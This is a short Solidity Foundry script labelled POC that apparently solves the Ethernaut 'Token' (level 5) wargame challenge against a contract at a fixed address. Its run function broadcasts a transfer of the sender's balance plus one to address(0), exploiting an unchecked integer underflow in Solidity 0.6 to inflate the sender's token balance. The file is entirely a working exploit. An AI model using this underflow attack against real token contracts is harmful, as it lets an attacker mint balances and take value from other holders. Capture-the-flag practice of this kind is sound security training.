// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/level5.sol";

contract POC is Script {
    Token level5 = Token(0x3d6D029aA799aD53Cc619e220bE6a32bB4bf9875);

    function run() external {
        vm.startBroadcast();

        level5.transfer(address(0), level5.balanceOf(msg.sender) + 1);
        level5.balanceOf(msg.sender);

        vm.stopBroadcast();
    }
}
